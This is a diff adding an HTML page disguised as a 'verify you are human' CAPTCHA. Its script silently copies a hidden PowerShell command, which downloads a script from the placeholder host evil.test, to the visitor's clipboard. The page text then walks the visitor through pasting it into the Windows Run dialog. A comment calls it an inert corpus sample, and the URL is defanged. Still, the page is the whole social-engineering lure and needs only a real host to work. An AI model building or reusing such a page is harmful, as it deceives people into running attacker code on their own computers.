@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Just a moment...</title></head>
+<body>
+<h1>Verify you are human</h1>
+<p>Complete the verification to continue to the site.</p>
+<ol>
+  <li>Press <b>Windows key + R</b> to open the Run dialog</li>
+  <li>Press <b>Ctrl + V</b> to paste, then press Enter</li>
+</ol>
+<button id="verify">I'm not a robot</button>
+<script>
+document.getElementById('verify').addEventListener('click', function () {
+  // INERT corpus sample: the string below is a placeholder, it points at a reserved host.
+  navigator.clipboard.writeText('powershell -w hidden -c "iwr hxxp://evil.test/a.ps1"');
+});
+</script>
+</body></html>
